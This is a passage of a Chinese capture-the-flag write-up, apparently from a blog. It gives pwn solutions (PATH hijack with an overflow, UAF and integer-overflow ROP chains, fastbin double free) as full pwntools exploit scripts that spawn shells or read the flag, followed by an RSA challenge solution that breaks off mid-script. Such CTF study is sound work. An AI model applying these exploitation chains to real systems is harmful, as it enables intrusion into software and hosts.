yourself :)\n&quot;</span>,drop=True)</span><br><span class="line">key=p.recvline().decode(<span class="string">&quot;utf-8&quot;</span>).strip()</span><br><span class="line">print(key)</span><br><span class="line">reslut=subprocess.run([<span class="string">&quot;./kctf-pow&quot;</span>,<span class="string">&quot;solve&quot;</span>,key],capture_output=True).<span class="built_in">stdout</span></span><br><span class="line">p.sendline(reslut)</span><br><span class="line">p.recvuntil(b<span class="string">&quot; $&quot;</span>)</span><br><span class="line">p.sendline(b<span class="string">&quot;echo -e &#x27;#!/bin/sh\n/bin/cat /flag&#x27; &gt; /work/id&quot;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&quot;$&quot;</span>,b<span class="string">&quot;chmod +x /work/id&quot;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&quot;$&quot;</span>,b<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&quot;Username &gt; \r\n&quot;</span>,b<span class="string">&quot;PATH=/work/&quot;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&quot;Password &gt; \r\n&quot;</span>,b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&quot;your cmd &gt; &quot;</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">0x168</span>+b<span class="string">&quot;\xe3&quot;</span>+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="unauth-diary-v2"><a href="#unauth-diary-v2" class="headerlink" title="unauth-diary-v2"></a>unauth-diary-v2</h3><p>漏洞：</p>
<p>存在明显的UAF和整数溢出，当malloc（0）的时候UAF残余的内存在edit时候用的len为0-1整数溢出，而堆中存放可以被地址指针及其读写长度，覆盖掉可以任意地址读写</p>
<p>利用思路</p>
<p>利用Edit的长度溢出覆盖下一个用于读写的指针与读写长度，</p>
<p>泄露environ指针劫持栈rop</p>
<p>由于本题是使用socket通信，因此不能直接system binsh与orw，想到两种方法</p>
<p>1.可以rop调用mprotect修改内存读写权限执行反弹shell的shellcode</p>
<p>2.可以rop调用dup2把0，1文件描述符复制到socket的文件描述符上，由于调用Exit从main返回前调用了一次write（fd,….)，因此dup2的第一个参数不用再额外设置（而此题为没有其他的fd被open因此按顺序生成，结合代码可知socket文件描述符始终未4）</p>
<p>试错</p>
<p>本地通了远程没通</p>
<p>原来是这个gadget的\x0a被识别为了\n导致的</p>
<p>pop_rsi_ret &#x3D; libc.address + 0x0000000000110a4d</p>
<p>脚本</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">def <span class="built_in">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> <span class="type">binary</span></span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf <span class="operator">=</span> ELF(<span class="type">binary</span>, checksec<span class="operator">=</span><span class="literal">False</span>)</span><br><span class="line">    libc <span class="operator">=</span> ELF(&quot;./libc/test-libc.so.6&quot;, checksec<span class="operator">=</span><span class="literal">False</span>)  </span><br><span class="line">    <span class="keyword">Create</span>(<span class="number">0x440</span>,b<span class="string">&#x27;unsorted bin&#x27;</span>)</span><br><span class="line">    <span class="keyword">Create</span>(<span class="number">0x68</span>,b<span class="string">&#x27;birrier&#x27;</span>)</span><br><span class="line">    Erase(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">Create</span>(<span class="number">0x18</span>,b<span class="string">&#x27;leaklib&#x27;</span>)</span><br><span class="line">    <span class="keyword">Show</span>(<span class="number">0</span>)</span><br><span class="line">    ru(b<span class="string">&#x27;leaklib\x00&#x27;</span>)</span><br><span class="line">    libc.address <span class="operator">=</span> uu64(ru(b<span class="string">&#x27;\x7f\x00\x00&#x27;</span>,<span class="keyword">drop</span><span class="operator">=</span><span class="literal">False</span>))<span class="operator">-</span> <span class="number">0x203f20</span></span><br><span class="line">    leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line">    heap_base <span class="operator">=</span> uu64(ru(b<span class="string">&#x27;\x00\x00\n&#x27;</span>,<span class="keyword">drop</span><span class="operator">=</span><span class="literal">True</span>)) <span class="operator">-</span> <span class="number">0x2b0</span></span><br><span class="line">    leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    <span class="keyword">Create</span>(<span class="number">-1</span>,b<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">Create</span>(<span class="number">8</span>,b<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    bin_sh <span class="operator">=</span> heap_base <span class="operator">+</span> <span class="number">0x350</span></span><br><span class="line">    environ <span class="operator">=</span> libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    Edit(<span class="number">2</span>,p64(<span class="number">0</span>)<span class="operator">*</span><span class="number">3</span><span class="operator">+</span>p64(<span class="number">0x21</span>)<span class="operator">+</span>p64(environ)<span class="operator">+</span>p64(<span class="number">9</span>))</span><br><span class="line">    <span class="keyword">Show</span>(<span class="number">3</span>)</span><br><span class="line">    leak(<span class="string">&#x27;environ&#x27;</span>,environ)</span><br><span class="line">    ru(b<span class="string">&#x27;Content:\n&#x27;</span>)</span><br><span class="line">    stack_leak <span class="operator">=</span> uu64(ru(b<span class="string">&#x27;\x7f\x00\x00&#x27;</span>,<span class="keyword">drop</span><span class="operator">=</span><span class="literal">False</span>))</span><br><span class="line">    leak(<span class="string">&#x27;stack_leak&#x27;</span>,stack_leak)</span><br><span class="line"></span><br><span class="line">    ret_of_main <span class="operator">=</span> stack_leak <span class="operator">-</span> <span class="number">0x250</span></span><br><span class="line">    # <span class="number">0x000000000010f75b</span> : pop rdi ; ret</span><br><span class="line">    pop_rdi_ret <span class="operator">=</span> libc.address <span class="operator">+</span> <span class="number">0x000000000010f75b</span></span><br><span class="line">    # <span class="number">0x0000000000110a4d</span> : pop rsi ; ret</span><br><span class="line">    # pop_rsi_ret <span class="operator">=</span> libc.address <span class="operator">+</span> <span class="number">0x0000000000110a4d</span></span><br><span class="line">    # <span class="number">0x00000000000fcf3c</span> : pop rsi ; <span class="keyword">or</span> bh, dh ; ret</span><br><span class="line">    pop_rsi_ret <span class="operator">=</span> libc.address <span class="operator">+</span> <span class="number">0x00000000000fcf3c</span></span><br><span class="line">    # <span class="number">0x0000000000099ce1</span> : pop rdx ; mov eax, <span class="number">0xc</span> ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="line">    pop_rdx_rbx_r12_r13_rbp_ret <span class="operator">=</span> libc.address <span class="operator">+</span> <span class="number">0x0000000000099ce1</span></span><br><span class="line">    # <span class="number">0x00000000000ab8a1</span> : pop rdx ; <span class="keyword">or</span> byte ptr [rcx <span class="operator">-</span> <span class="number">0xa</span>], al ; ret</span><br><span class="line">    execve <span class="operator">=</span> libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">    dup2 <span class="operator">=</span> libc.sym[<span class="string">&#x27;dup2&#x27;</span>]</span><br><span class="line">    # 由于上面的指令从write(fd,....)开始没动过rdi，因此dup2系统调用可以直接复用fd文件描述符</span><br><span class="line">    rop_chain <span class="operator">=</span> [   </span><br><span class="line">        pop_rsi_ret,<span class="number">0</span>,dup2,</span><br><span class="line">        pop_rsi_ret,<span class="number">1</span>,dup2,</span><br><span class="line">        pop_rsi_ret,<span class="number">2</span>,dup2,</span><br><span class="line">        pop_rdi_ret,bin_sh,pop_rsi_ret,<span class="number">0</span>,pop_rdx_rbx_r12_r13_rbp_ret,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        execve</span><br><span class="line">        ]</span><br><span class="line">    payload <span class="operator">=</span> b<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> rop <span class="keyword">in</span> rop_chain:</span><br><span class="line">        payload <span class="operator">+</span><span class="operator">=</span> p64(rop)</span><br><span class="line">    Edit(<span class="number">2</span>,p64(<span class="number">0</span>)<span class="operator">*</span><span class="number">3</span><span class="operator">+</span>p64(<span class="number">0x21</span>)<span class="operator">+</span>p64(ret_of_main)<span class="operator">+</span>p64(<span class="number">0xffff</span>))</span><br><span class="line">    Edit(<span class="number">3</span>,payload)</span><br><span class="line">    <span class="keyword">Close</span>()</span><br></pre></td></tr></table></figure>

<h3 id="ez-jail"><a href="#ez-jail" class="headerlink" title="ez_jail"></a>ez_jail</h3><p>Add 函数这里两个漏洞， 一个是heapList可以越界写覆盖begin addr从而绕过题目给的只能任意地址读写一次的限制 第二个是当输入content长度为0时，content内容不会被覆盖，有uaf的读</p>
<p>最后一个利用思路就是这个题存在由于free后没有置空heapList的指针导致的UAF，因此可以double free，但是tcahe bin的double free会检查，按理说house of botcake时能够绕过tcache bin的double free的检查的，但是fastbin double free也可以绕过，（而且最终构造fake chunk的fastbin在另一个fastbin被分配后会变成tcache bin，没有fastbin attacke的chunksize的限制），因此free 7次后的小于0x80大小的chunk进入fastbin，利用uaf+越界覆盖beginaddr 可以先后读写泄露environ指针，写Add 函数的ret时候的栈rop</p>
<p>注意2.39 tcache的分配时会对地址进行0xf对齐的检查</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if ( !heaplist[idx]</span><br><span class="line">      || heaplist[idx] &lt; (unsigned __int64)begin_addr</span><br><span class="line">      || (unsigned __int64)(begin_addr + 0x21000) &lt; heaplist[idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( oops != 0xDEADBEAF )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;Oops.&quot;);</span><br><span class="line">        _exit(0);</span><br><span class="line">      &#125;</span><br><span class="line">      oops = 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>_exit不是exit，不能用apple的链子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">exit-&gt;_IO_wfile_overflow --&gt; _IO_wdoallocbuf --&gt; _IO_WDOALLOCATE</span><br><span class="line">pwndbg&gt; search  -4 0x7fffff libc</span><br><span class="line"></span><br><span class="line">Searching for a 4-byte integer: b&#x27;\xff\xff\x7f\x00&#x27;</span><br><span class="line">libc.so.6       0x7ffff7dd22f4 0x50000001007fffff</span><br><span class="line">libc.so.6       0x7ffff7def64d 0xc285f8d3007fffff</span><br><span class="line">libc.so.6       0x7ffff7def6b9 0xe281a775007fffff</span><br><span class="line">libc.so.6       0x7ffff7e05ea5 0xd609c609007fffff</span><br><span class="line">libc.so.6       0x7ffff7f0a30a 0x89480100007fffff</span><br><span class="line">libc.so.6       0x7ffff7f57b1f 0xce834100007fffff</span><br><span class="line">libc.so.6       0x7ffff7f58754 0xe7394c00007fffff</span><br><span class="line">libc.so.6       0x7ffff7f5a34a 0xc2394c00007fffff</span><br><span class="line">libc.so.6       0x7ffff7f5c4cd 0x7fffff</span><br><span class="line">libc.so.6       0x7ffff7f5c509 0x7fffff</span><br><span class="line">libc.so.6       0x7ffff7f5c52d 0x7fffff</span><br><span class="line">libc.so.6       0x7ffff7f5c569 0x7fffff</span><br><span class="line">libc.so.6       0x7ffff7f807c5 0x7fffff</span><br><span class="line">libc.so.6       0x7ffff7f80801 0x7fffff</span><br><span class="line">libc.so.6       0x7ffff7fad831 0x70000000007fffff</span><br><span class="line">libc.so.6       0x7ffff7fad8b1 0x58000000007fffff</span><br><span class="line">libc.so.6       0x7ffff7faf373 0xffefc700007fffff</span><br><span class="line">libc.so.6       0x7ffff7faf37b 0x7fffff</span><br><span class="line">libc.so.6       0x7ffff7faf6e3 0x100007fffff</span><br></pre></td></tr></table></figure>

<p>由于要找栈地址，且libc的地址需要0xf对齐，形如：0x00007fffffXXXXXX，因此0x007fffffff所在的地址是最后一位是3，找到两个符合要求的，但是但是0x7ffff7faf370处的栈指针竟然不是固定值？？，还是用0x7ffff7faf6e0吧</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">def <span class="built_in">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> <span class="type">binary</span></span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf <span class="operator">=</span> ELF(<span class="type">binary</span>, checksec<span class="operator">=</span><span class="literal">False</span>)</span><br><span class="line">    libc <span class="operator">=</span> ELF(&quot;./libc/libc.so.6&quot;, checksec<span class="operator">=</span><span class="literal">False</span>) </span><br><span class="line">    # pause() </span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">0</span>,<span class="number">0x440</span>,b<span class="string">&#x27;unsorted to leak fd/bk&#x27;</span>)</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">15</span>,<span class="number">0x440</span>,b<span class="string">&#x27;barrier chunk&#x27;</span>)</span><br><span class="line">    # <span class="keyword">Add</span>(<span class="number">0</span>,<span class="number">0</span>,b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">Free</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">Show</span>(<span class="number">0</span>)</span><br><span class="line">    libc.address <span class="operator">=</span> uu64(ru(b<span class="string">&#x27;\n1.add&#x27;</span>,<span class="keyword">drop</span><span class="operator">=</span><span class="literal">True</span>)) <span class="operator">-</span> <span class="number">0x203b20</span></span><br><span class="line">    leak(&quot;libc.address&quot;,libc.address)</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">0</span>,<span class="number">0x20</span>,b<span class="string">&#x27;leak heap base&#x27;</span>)</span><br><span class="line">    <span class="keyword">Free</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">Show</span>(<span class="number">0</span>)</span><br><span class="line">    xor_heap <span class="operator">=</span> uu64(ru(b<span class="string">&#x27;\n1.add&#x27;</span>,<span class="keyword">drop</span><span class="operator">=</span><span class="literal">True</span>))</span><br><span class="line">    heap_base <span class="operator">=</span> xor_heap <span class="operator">&lt;&lt;</span> <span class="number">4</span><span class="operator">*</span><span class="number">3</span></span><br><span class="line">    leak(&quot;heap_base&quot;,heap_base)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">Add</span>(i,<span class="number">0x10</span>,f<span class="string">&#x27;tcache 2 fastbin &#123;i&#125;&#x27;</span>.encode())</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">8</span>,<span class="number">0x10</span>,b<span class="string">&#x27;double free &#x27;</span><span class="operator">*</span><span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">Free</span>(i)</span><br><span class="line">    # pause()</span><br><span class="line">    <span class="keyword">Free</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">Free</span>(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">Free</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">Add</span>(i,<span class="number">0x10</span>,f<span class="string">&#x27;tcache 2 fastbin &#123;i&#125;&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">    stack_addr_in_libc <span class="operator">=</span> libc.address <span class="operator">+</span> <span class="number">0x2046e0</span></span><br><span class="line">    leak(&quot;stack_addr_in_libc&quot;,stack_addr_in_libc)</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">8</span>,<span class="number">0x10</span>,p64((stack_addr_in_libc)<span class="operator">^</span>xor_heap))</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">7</span>,<span class="number">0x10</span>,b<span class="string">&#x27;between the double free chunk&#x27;</span>)</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">8</span>,<span class="number">0x10</span>,b<span class="string">&#x27;next aclloc will at will&#x27;</span>)</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">16</span>,<span class="number">0</span>,b<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">Show</span>(<span class="number">16</span>)</span><br><span class="line">    leak_stack <span class="operator">=</span> uu64(ru(b<span class="string">&#x27;\n1.add&#x27;</span>,<span class="keyword">drop</span><span class="operator">=</span><span class="literal">True</span>))</span><br><span class="line">    leak(&quot;leak_stack&quot;,leak_stack)</span><br><span class="line">    ret_of_add <span class="operator">=</span> leak_stack <span class="operator">-</span> <span class="number">0x130</span></span><br><span class="line">    leak(&quot;ret_of_add&quot;,ret_of_add)</span><br><span class="line">    # <span class="number">0x000000000010f75b</span> : pop rdi ; ret</span><br><span class="line">    pop_rdi_ret <span class="operator">=</span> libc.address <span class="operator">+</span> <span class="number">0x000000000010f75b</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">16</span>,<span class="number">0x20</span>,b<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    flag_addr <span class="operator">=</span> heap_base <span class="operator">+</span><span class="number">0x2a0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">Add</span>(i,<span class="number">0x70</span>,f<span class="string">&#x27;tcache 2 fastbin &#123;i&#125;&#x27;</span>.encode())</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">8</span>,<span class="number">0x70</span>,b<span class="string">&#x27;double free &#x27;</span><span class="operator">*</span><span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">15</span>,<span class="number">0x400</span>,b<span class="string">&#x27;barrier chunk&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">Free</span>(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Free</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">Free</span>(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">Free</span>(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">Add</span>(i,<span class="number">0x70</span>,f<span class="string">&#x27;tcache 2 fastbin &#123;i&#125;&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">8</span>,<span class="number">0x70</span>,p64((ret_of_add<span class="number">-8</span>)<span class="operator">^</span>xor_heap))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">7</span>,<span class="number">0x70</span>,b<span class="string">&#x27;between the double free chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">8</span>,<span class="number">0x70</span>,b<span class="string">&#x27;next aclloc will at will&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload <span class="operator">=</span> flat(</span><br><span class="line">        b<span class="string">&#x27;a&#x27;</span><span class="operator">*</span><span class="number">8</span>,</span><br><span class="line">        pop_rdi_ret<span class="operator">+</span><span class="number">1</span>,</span><br><span class="line">        pop_rdi_ret,</span><br><span class="line">        flag_addr,</span><br><span class="line">        libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    )</span><br><span class="line">    leak(&quot;ret_of_add&quot;,ret_of_add)</span><br><span class="line">    <span class="keyword">Add</span>(<span class="number">16</span>,<span class="number">0x70</span>,payload)</span><br></pre></td></tr></table></figure>

<h3 id="nothing-left"><a href="#nothing-left" class="headerlink" title="nothing_left"></a>nothing_left</h3><h3 id="Old-school-parser"><a href="#Old-school-parser" class="headerlink" title="Old school parser"></a>Old school parser</h3><h2 id="CRYPTO（9-21）"><a href="#CRYPTO（9-21）" class="headerlink" title="CRYPTO（9&#x2F;21）"></a>CRYPTO（9&#x2F;21）</h2><h3 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h3><p>Factordb 梭了</p>
<p><a target="_blank" rel="noopener" href="https://factordb.com/index.php?query=127060392619341060272126983366487069092712215979664340339428955285201267724168574813227106020122399594060458777939446978632526348867806863618885370221957087197582864380885199290793062293120324984868138488667017882272415668310242448870352699380394381756621677031459335310964085476227148301120850021800822495119">factordb.com</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">queryFactors</span>(<span class="params">n</span>):</span><br><span class="line">        s=[]</span><br><span class="line">        url=<span class="string">&quot;http://factordb.com/api?query=&quot;</span>+<span class="built_in">str</span>(n)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        factors=r.json()[<span class="string">&#x27;factors&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> factors:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(f[<span class="number">1</span>]):</span><br><span class="line">                        s.append(<span class="built_in">int</span>(f[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">n = <span class="number">127060392619341060272126983366487069092712215979664340339428955285201267724168574813227106020122399594060458777939446978632526348867806863618885370221957087197582864380885199290793062293120324984868138488667017882272415668310242448870352699380394381756621677031459335310964085476227148301120850021800822495119</span></span><br><span class="line">p,q = queryFactors(n)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ct = <span class="number">18305235107479382231970252522433686185039231184629854177334609960907102735540326234277108553640185845164498239822263821349544015918443334769445559622730315115384134147808359107914969010678607157349844717217781801237935737980608575612421610972048739840839726108493286994232100086338529591086935374295281642738</span></span><br><span class="line">gift = <span class="number">8312456126096895497368692810699639462746223116345115761188530231045483000989605820</span></span><br><span class="line"></span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(ct,d,n)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;ec6f23afd0b7453bb8224146b6aad196&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>预期解：求解p高位，已知p高位的coppersmith</p>
<p>$$(gift&lt;&lt;750) ≈ (2025p+r^2)*p+k(p-1)(q-1)\ (gift&lt;&lt;750)*p ≈ (2025p+r^2)*p^2+k(p-1)(n-p)$$</p>
<p>得到一个关于p的方程，解出后可利用coppersmith求解完整的p</p>
<p>对于k的范围，有</p>
<p>$$(gift&lt;&lt;750) ≈ (2025p+r^2)*p+k\phi\ 令A&#x3D;(2025p+r^2)<em>p\ k\phi &#x3D; (gift&lt;&lt;750)-A\ 2025p^2 ≈2^{1024+11}&#x3D;2^{1035} r^2</em>p ≈2^{704}\ k≈A&#x2F;\phi≈2025p^2&#x2F;pq&#x3D;2025p&#x2F;q\ 2^{511}</p>
<p>那么令f(p) 为</p>
<p>$$f(p) &#x3D; (2025p+r^2)*p^2+k(p-1)(n-p)-(gift&lt;&lt;750)*p $$</p>
<p>求得p高位</p>
<p>然后构造p&#x3D;p_high+p_low，用small_roots求解p_low</p>
<p><a target="_blank" rel="noopener" href="https://tangcuxiaojikuai.xyz/post/506fe59c.html">2025-N1CTF-junior-wp-crypto | 糖醋小鸡块的blog</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">127060392619341060272126983366487069092712215979664340339428955285201267724168574813227106020122399594060458777939446978632526348867806863618885370221957087197582864380885199290793062293120324984868138488667017882272415668310242448870352699380394381756621677031459335310964085476227148301120850021800822495119</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ct = <span class="number">18305235107479382231970252522433686185039231184629854177334609960907102735540326234277108553640185845164498239822263821349544015918443334769445559622730315115384134147808359107914969010678607157349844717217781801237935737980608575612421610972048739840839726108493286994232100086338529591086935374295281642738</span></span><br><span class="line">gift = <span class="number">8312456126096895497368692810699639462746223116345115761188530231045483000989605820</span></span><br><span class="line"></span><br><span class="line">r = bytes_to_long(<span class="string">b&#x27;n1junior2025&#x27;</span>)</span><br><span class="line">G = gift &lt;&lt; <span class="number">750</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(RealField(<span class="number">1000</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1000</span>, <span class="number">4000</span>):</span><br><span class="line">    f = (<span class="number">2025</span>*x + r*r)*x^<span class="number">2</span> - 